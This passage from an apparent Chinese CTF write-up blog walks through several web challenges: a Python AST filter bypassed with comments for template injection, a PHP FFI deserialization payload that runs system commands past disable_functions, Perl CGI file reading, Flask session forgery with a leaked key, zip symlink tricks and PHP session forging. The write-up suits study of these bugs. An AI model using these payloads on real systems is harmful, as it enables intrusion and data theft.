    if isinstance(node, ast.Compare):
        return (
            "("
            + format_ast(node.left)
            + "".join(
                [
                    operators[node.ops[i].__class__] + format_ast(node.comparators[i])
                    for i in range(len(node.ops))
                ]
            )
            + ")"
        )


def check_ast(code_ast):
    for _, nodes in ast.iter_fields(code_ast):
        if type(nodes) != list:
            nodes = [nodes]
        for node in nodes:
            if node.__class__ not in whitelist:
                return False, node.__class__.__name__
            if not node.__class__ == ast.Num:
                result = check_ast(node)
                if not result[0]:
                    return result

    return True, None


def validate(code):
    if len(code) > 512:
        return False, "That's a bit too long m8"

    if "__" in code:
        return False, "I dont like that long floor m8"
    if "[" in code or "]" in code:
        return False, "I dont like that 3/4 of a rectangle m8"
    if '"' in code:
        return False, "I dont like those two small vertical lines m8"
    if "'" in code:
        return False, "I dont like that small vertical line m8"

    try:
        code_ast = ast.parse(code, mode="eval")
    except SyntaxError:
        return False, "Check your syntax m8"
    except ValueError:
        return False, "Handle your null bytes m8"

    result = check_ast(code_ast)
    if result[0]:
        return True, format_ast(code_ast)

    return False, f"You cant use ast.{result[1]} m8"
```

server 没有什么好说的, 我们主要关注 evalfilter.py 中的内容

与常规 ssti 过滤不同的地方在于他是通过 AST 抽象语法树来实现过滤操作

AST 简单来说就是对于源代码 (字符串形式) 的抽象表示, 通过树状结构来表示编程语言的语法结构

在 python 中自带了一个 ast 库便于我们生成对应源码的语法树

![image-20221223194637752](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212231946102.png)

稍微排版一下

```python
Module(
	body = [
		Assign(targets = [Name(id = 'a', ctx = Store())], value = Constant(value = 1)),
		Assign(targets = [Name(id = 'b', ctx = Store())], value = Constant(value = 2)),
		FunctionDef(
			name = 'add',
			args = arguments(
				posonlyargs = [],
				args = [arg(arg = 'x'), arg(arg = 'y')],
				kwonlyargs = [],
				kw_defaults = [],
				defaults = []
			),
			body = [
				Return(
					value = BinOp(
						left = Name(id = 'a', ctx = Load()),
						op = Add(),
						right = Name(id = 'b', ctx = Load()),
						)
					)
				],
			decorator_list = []
		),
		Assign(
			targets = [Name(id = 'c', ctx = Store())],
			value = Call(
				func = Name(id = 'add', ctx = Load()),
				args = [Name(id = 'a', ctx = Load()), Name(id = 'b', ctx = Load())],
				keywords = []
			)
		),
		Expr(
			value = Call(
				func = Name(id = 'print', ctx = Load()),
				args = [Name(id = 'c', ctx = Load())],
				keywords = []
			)
		)
	],
	type_ignores = []
)
```

具体参考文档 [https://docs.python.org/zh-cn/3/library/ast.html](https://docs.python.org/zh-cn/3/library/ast.html)

我们到现在为止只需要知道他会把我们输入代码中的每一个 token 都转换为一个节点类来表示 (Assign, FunctionDef, Return, Call, Expr...) 即可

evilfilter 首先通过 ast 中的节点类来定义 whitelist, 然后定义 operators (运算符)

然后定义了三个函数, 分别是 `format_ast`, `check_ast` 和 `validate`

先看 validate

```python
def validate(code):
    if len(code) > 512:
        return False, "That's a bit too long m8"

    if "__" in code:
        return False, "I dont like that long floor m8"
    if "[" in code or "]" in code:
        return False, "I dont like that 3/4 of a rectangle m8"
    if '"' in code:
        return False, "I dont like those two small vertical lines m8"
    if "'" in code:
        return False, "I dont like that small vertical line m8"

    try:
        code_ast = ast.parse(code, mode="eval")
    except SyntaxError:
        return False, "Check your syntax m8"
    except ValueError:
        return False, "Handle your null bytes m8"

    result = check_ast(code_ast)
    if result[0]:
        return True, format_ast(code_ast)

    return False, f"You cant use ast.{result[1]} m8"
```

首先通过常规方式来过滤一些字符, 然后调用 `check_ast`

```python
def check_ast(code_ast):
    for _, nodes in ast.iter_fields(code_ast):
        if type(nodes) != list:
            nodes = [nodes]
        for node in nodes:
            if node.__class__ not in whitelist:
                return False, node.__class__.__name__
            if not node.__class__ == ast.Num:
                result = check_ast(node)
                if not result[0]:
                    return result

    return True, None
```

在 `check_ast` 中通过递归来遍历树中的每一个节点, 并判断节点是否在白名单中

最后给出判断结果, 回到 `validate` 函数, 如果都在白名单中则调用 `format_ast` 并返回 true, 否则返回 false 并给出被禁止的 ast 节点类

马后炮一下, 在这里根据错误信息应该多少能看出来一点东西 (

![image-20221223201455580](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212232014641.png)

毕竟以 `ast.` 开头, 如果提前知道 ast 和污点分析的话应该很容易想到绕过方式 (说到底还是我太菜了)

最后还有个 `format_ast`, 作用是根据语法树来还原代码

```python
def format_ast(node):

    if isinstance(node, ast.Expression):
        code = format_ast(node.body)
        if code[0] == "(" and code[-1] == ")":
            code = code[1:-1]
        return code
    if isinstance(node, ast.Num):
        return str(node.n)
    if isinstance(node, ast.UnaryOp):
        return operators[node.op.__class__] + format_ast(node.operand)
    if isinstance(node, ast.BinOp):
        return (
            "("
            + format_ast(node.left)
            + operators[node.op.__class__]
            + format_ast(node.right)
            + ")"
        )
    if isinstance(node, ast.BoolOp):
        return (
            "("
            + operators[node.op.__class__].join(
                [format_ast(value) for value in node.values]
            )
            + ")"
        )
    if isinstance(node, ast.Compare):
        return (
            "("
            + format_ast(node.left)
            + "".join(
                [
                    operators[node.ops[i].__class__] + format_ast(node.comparators[i])
                    for i in range(len(node.ops))
                ]
            )
            + ")"
        )
```

说了这么多 ast 的内容, 其实对于题目本身来说绕过的点很简单, 那就是用 ast 生成语法树的时候不会生成注释所对应的节点

![image-20221223202258737](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212232022896.png)

`# {{config}}` 这个注释完全就被后面的 `check_ast` 函数忽略了

再说一下为什么需要通过 `1/0` 的形式报错才能够 ssti

```python
@app.route("/", methods=["GET", "POST"])
def index():
    if not session.get("history"):
        session["history"] = []

    if request.method == "POST":
        result = validate(request.form["code"])
        if not result[0]:
            return result[1]

        session["history"].append({"code": result[1]})
        if len(session["history"]) > 5:
            session["history"] = session["history"][1:]
        session.modified = True

        try:
            eval(request.form["code"])
        except:
            error = traceback.format_exc(limit=0)[35:]
            session["history"][-1]["error"] = render_template_string(
                f'Traceback (most recent call last):\n  File "somewhere", line something, in something\n    result = {request.form["code"]}\n{error}'
            )

    history = []
    for calculation in session["history"]:
        history.append({**calculation})
        if not calculation.get("error"):
            history[-1]["result"] = eval(calculation["code"])

    return render_template("index.html", history=list(reversed(history)))
```

可以看到报错的时候传入的还是 `request.form["code"]`, 而 `format_ast` 生成的代码存在了 `session['history']` 里面, 之后才执行 eval

因为生成的语法树里面没有注释, 所以反推过来的代码肯定也没有注释

如果不走 except 流程的话, 正常的代码会经过一次 ast 解析然后反推的步骤, 最终从 `session['history']` 取出代码执行 eval, 然后写入 history result, 这个过程肯定不会存在 ssti

所以必须要让执行的代码报错, 然后进入 except 才能 ssti

## [RCTF 2019]Nextphp

index.php

```php
<?php
if (isset($_GET['a'])) {
    eval($_GET['a']);
} else {
    show_source(__FILE__);
}
```

preload.php

```php
<?php
final class A implements Serializable {
    protected $data = [
        'ret' => null,
        'func' => 'print_r',
        'arg' => '1'
    ];

    private function run () {
        $this->data['ret'] = $this->data['func']($this->data['arg']);
    }

    public function __serialize(): array {
        return $this->data;
    }

    public function __unserialize(array $data) {
        array_merge($this->data, $data);
        $this->run();
    }

    public function serialize (): string {
        return serialize($this->data);
    }

    public function unserialize($payload) {
        $this->data = unserialize($payload);
        $this->run();
    }

    public function __get ($key) {
        return $this->data[$key];
    }

    public function __set ($key, $value) {
        throw new \Exception('No implemented');
    }

    public function __construct () {
        throw new \Exception('No implemented');
    }
}
```

phpinfo (php 7.4)

![image-20221224120952439](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212241209531.png)

![image-20221224120843988](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212241208076.png)

需要绕过 disable\_functions, 另外 open\_basedir 也限制成了当前目录

7.4 试了下 backtrace uaf 不行, 那就只剩 ffi 了

参考文档

[https://www.php.net/manual/zh/ffi.configuration.php](https://www.php.net/manual/zh/ffi.configuration.php)

[https://www.php.net/manual/zh/opcache.preloading.php](https://www.php.net/manual/zh/opcache.preloading.php)

![image-20221224121101532](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212241211671.png)

默认仅允许从被 preload 的文件中调用 ffi

但 op.preload 指定的文件只会在服务器启动时被预加载, 所以我们需要利用它已有的 class 来反序列化调用 ffi

ffi 基本形式

```php
<?php
$ffi = FFI::cdef("int system(const char *command);");
$ffi->system("whoami >/tmp/1");
echo file_get_contents("/tmp/1");
@unlink("/tmp/1");
?>
```

构造反序列化

```php
<?php
final class A implements Serializable {
    protected $data = [
        'ret' => null,
        'func' => 'FFI::cdef',
        'arg' => 'int system(const char *command);'
    ];

    private function run () {
        $this->data['ret'] = $this->data['func']($this->data['arg']);
    }

    public function __serialize(): array {
        return $this->data;
    }

    public function __unserialize(array $data) {
        array_merge($this->data, $data);
        $this->run();
    }

    public function serialize(): string {
        return serialize($this->data);
    }

    public function unserialize($payload) {
        $this->data = unserialize($payload);
        $this->run();
    }
}

$a = new A();
echo urlencode(serialize($a));
```

```
http://f700efac-15ac-49d3-add3-50a452221de2.node4.buuoj.cn:81/?a=unserialize(urldecode('C%3A1%3A%22A%22%3A95%3A%7Ba%3A3%3A%7Bs%3A3%3A%22ret%22%3BN%3Bs%3A4%3A%22func%22%3Bs%3A9%3A%22FFI%3A%3Acdef%22%3Bs%3A3%3A%22arg%22%3Bs%3A32%3A%22int+system%28const+char+%2Acommand%29%3B%22%3B%7D%7D'))->ret->system('cat /flag > /var/www/html/res.txt');
```

![image-20221224121342138](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212241213217.png)

看 wp 的时候发现有人提到说需要把 `__serialize()` 方法的定义删掉才行

翻了下官方文档

![image-20221224121557908](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212241215972.png)

[https://www.php.net/manual/zh/class.serializable](https://www.php.net/manual/zh/class.serializable)

![image-20221224121626391](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212241216513.png)

自己生成 payload 时的 php 版本为 7.2, 所以没有这个问题, 大于 7.4 版本就需要删了

然后提一句, 继承了 Serializable 接口的类序列化后得到的字符串以 `C` 开头而不是 `O`

另外这个接口的序列化/反序列化逻辑感觉跟 java 挺像的 (

## [BSidesCF 2019]Pick Tac Toe

一开始没搞懂要干什么, 看到 cookie 中的 `rack.session` 还在想是不是 ruby 反序列化

然后发现是要下棋...

```
ul u ur
l  c r
bl b br
```

从浏览器的角度来看, 机器人下过的地方我们是点不了的

但是可以通过 burp 抓包来修改, 改到一处机器人下过的地方, 就能拿到 flag

![image-20221224131256312](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212241312403.png)

## [CSAWQual 2016]i_got_id

black asia 2016 的议题, 挺有意思的

[https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf](https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf)

考虑如下 perl 脚本

```perl
use strict;
use warnings;
use CGI;
my $cgi = CGI->new; 
if ( $cgi->upload( 'file' ) ) {
	my $file = $cgi->param( 'file' );
	while ( <$file> ) {
		print "$_";
	}
}
```

首先 `$cgi->upload('file')` 检测多个名为 file 的参数是否为上传表单

然后 `$cgi->param('file')` 会返回一个包含多个 file 的 list, 但是只有第一个会被赋值给 `$file` 变量

思路就是先 post file 上传表单, 同时传递一个在首位的 file 参数并指定值为 `ARGV`, 最后在 get 后面传入要读取的文件即可 (ppt 提到 `<>` 不接受普通字符串, 但是会解析 `ARGV` 这个变量)

![image-20221224153150140](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212241531228.png)

也可以执行命令

![image-20221224154315923](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212241543996.png)

## [SWPU2019]Web3

随便输入账号密码登入后有文件上传, 但是普通用户没有权限

404 header 存在 `swpuctf_csrf_token`

![image-20221224161027052](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212241610125.png)

base64 解码后内容为 `SECRET_KEY:keyqqqwwweee!@#$%^&*`

然后伪造 admin session

![image-20221224161127729](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212241611968.png)

文件上传

![image-20221224161138741](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212241611808.png)

```python
@app.route('/upload',methods=['GET','POST'])
def upload():
    if session['id'] != b'1':
        return render_template_string(temp)
    if request.method=='POST':
        m = hashlib.md5()
        name = session['password']
        name = name+'qweqweqwe'
        name = name.encode(encoding='utf-8')
        m.update(name)
        md5_one= m.hexdigest()
        n = hashlib.md5()
        ip = request.remote_addr
        ip = ip.encode(encoding='utf-8')
        n.update(ip)
        md5_ip = n.hexdigest()
        f=request.files['file']
        basepath=os.path.dirname(os.path.realpath(__file__))
        path = basepath+'/upload/'+md5_ip+'/'+md5_one+'/'+session['username']+"/"
        path_base = basepath+'/upload/'+md5_ip+'/'
        filename = f.filename
        pathname = path+filename
        if "zip" != filename.split('.')[-1]:
            return 'zip only allowed'
        if not os.path.exists(path_base):
            try:
                os.makedirs(path_base)
            except Exception as e:
                return 'error'
        if not os.path.exists(path):
            try:
                os.makedirs(path)
            except Exception as e:
                return 'error'
        if not os.path.exists(pathname):
            try:
                f.save(pathname)
            except Exception as e:
                return 'error'
        try:
            cmd = "unzip -n -d "+path+" "+ pathname
            if cmd.find('|') != -1 or cmd.find(';') != -1:
				waf()
                return 'error'
            os.system(cmd)
        except Exception as e:
            return 'error'
        unzip_file = zipfile.ZipFile(pathname,'r')
        unzip_filename = unzip_file.namelist()[0]
        if session['is_login'] != True:
            return 'not login'
        try:
            if unzip_filename.find('/') != -1:
                shutil.rmtree(path_base)
                os.mkdir(path_base)
                return 'error'
            image = open(path+unzip_filename, "rb").read()
            resp = make_response(image)
            resp.headers['Content-Type'] = 'image/png'
            return resp
        except Exception as e:
            shutil.rmtree(path_base)
            os.mkdir(path_base)
            return 'error'
    return render_template('upload.html')


@app.route('/showflag')
def showflag():
    if True == False:
        image = open(os.path.join('./flag/flag.jpg'), "rb").read()
        resp = make_response(image)
        resp.headers['Content-Type'] = 'image/png'
        return resp
    else:
        return "can't give you"
```

通过软链接连接到 `./flag/flag.jpg`

![image-20221224161313229](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212241613447.png)

![image-20221224161324798](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212241613875.png)

当然 filename 处也能执行命令

![image-20221224161714859](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212241617927.png)

## [HarekazeCTF2019]Easy Notes

题目其实给了源码, 但是 buu 没说

下面只贴关键地方的源码

lib.php

```php
<?php
function redirect($path) {
  header('Location: ' . $path);
  exit();
}

// utility functions
function e($str) {
  return htmlspecialchars($str, ENT_QUOTES);
}

// user-related functions
function validate_user($user) {
  if (!is_string($user)) {
    return false;
  }

  return preg_match('/\A[0-9A-Z_-]{4,64}\z/i', $user);
}

function is_logged_in() {
  return isset($_SESSION['user']) && !empty($_SESSION['user']);
}

function set_user($user) {
  $_SESSION['user'] = $user;
}

function get_user() {
  return $_SESSION['user'];
}

function is_admin() {
  if (!isset($_SESSION['admin'])) {
    return false;
  }
  return $_SESSION['admin'] === true;
}

// note-related functions
function get_notes() {
  if (!isset($_SESSION['notes'])) {
    $_SESSION['notes'] = [];
  }
  return $_SESSION['notes'];
}

function add_note($title, $body) {
  $notes = get_notes();
  array_push($notes, [
    'title' => $title,
    'body' => $body,
    'id' => hash('sha256', microtime())
  ]);
  $_SESSION['notes'] = $notes;
}

function find_note($notes, $id) {
  for ($index = 0; $index < count($notes); $index++) {
    if ($notes[$index]['id'] === $id) {
      return $index;
    }
  }
  return FALSE;
}

function delete_note($id) {
  $notes = get_notes();
  $index = find_note($notes, $id);
  if ($index !== FALSE) {
    array_splice($notes, $index, 1);
  }
  $_SESSION['notes'] = $notes;
}
```

export.php

```php
<?php
require_once('init.php');

if (!is_logged_in()) {
  redirect('/easy-notes/?page=home');
}

$notes = get_notes();

if (!isset($_GET['type']) || empty($_GET['type'])) {
  $type = 'zip';
} else {
  $type = $_GET['type'];
}

$filename = get_user() . '-' . bin2hex(random_bytes(8)) . '.' . $type;
$filename = str_replace('..', '', $filename); // avoid path traversal
$path = TEMP_DIR . '/' . $filename;

if ($type === 'tar') {
  $archive = new PharData($path);
  $archive->startBuffering();
} else {
  // use zip as default
  $archive = new ZipArchive();
  $archive->open($path, ZIPARCHIVE::CREATE | ZipArchive::OVERWRITE);
}

for ($index = 0; $index < count($notes); $index++) {
  $note = $notes[$index];
  $title = $note['title'];
  $title = preg_replace('/[^!-~]/', '-', $title);
  $title = preg_replace('#[/\\?*.]#', '-', $title); // delete suspicious characters
  $archive->addFromString("{$index}_{$title}.json", json_encode($note));
}

if ($type === 'tar') {
  $archive->stopBuffering();
} else {
  $archive->close();
}

header('Content-Disposition: attachment; filename="' . $filename . '";');
header('Content-Length: ' . filesize($path));
header('Content-Type: application/zip');
readfile($path);
```

init.php

```php
<?php

require_once('config.php');
require_once('lib.php');

session_save_path(TEMP_DIR);
session_start();

var_dump($_SESSION);
```

config.php

```php
<?php
define('TEMP_DIR', 'tmp/');
```

这题总的来说很有意思 (毕竟国外比赛), 关键在于如何利用 session 保存路径和 export 时的保存路径一致这个点来伪造 session

本地搭建一下看看 session 文件的内容

```php
user|s:5:"sess_";notes|a:1:{i:0;a:3:{s:5:"title";s:3:"aaa";s:4:"body";s:3:"bbb";s:2:"id";s:64:"5e06710fa757960b2f4a88f7df0c3385f24d563e7a0f7120aec6a77233a3062c";}}
```

session 中的每一个属性通过 `;` 来分隔

然后我们需要凭空伪造出 `$_SESSION['admin'] = true` 这一条内容, 即 `admin|b:1;`

恰好 session 保存路径和 export 时的保存路径一样, 且经过测试发现题目使用了 `php` 这个 `session.serialize.handler`

然后 export 的文件名后缀可控, `$filename = get_user() . '-' . bin2hex(random_bytes(8)) . '.' . $type;` 这句中的字符也符合 session id 的规定

最重要的是, 在导出压缩包的时候程序会将 note title 作为文件名写入 zip 文件, 而文件名在 zip raw 内容中可见

所以最终的思路就是以 `sess_` 作为用户名登录, 添加一个 title 为 `N;admin|b:1;` 的 note, 然后导出一个名字为 `sess_-xxxxxxxx` 的压缩文件到 tmp dir 下, 最后修改 phpsessid 为 `-xxxxxxxx`, 就可以成功伪造 session 得到 flag

![image-20221224183702615](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212241837661.png)

![image-20221224183719617](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212241837692.png)

![image-20221224183743490](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212241837565.png)
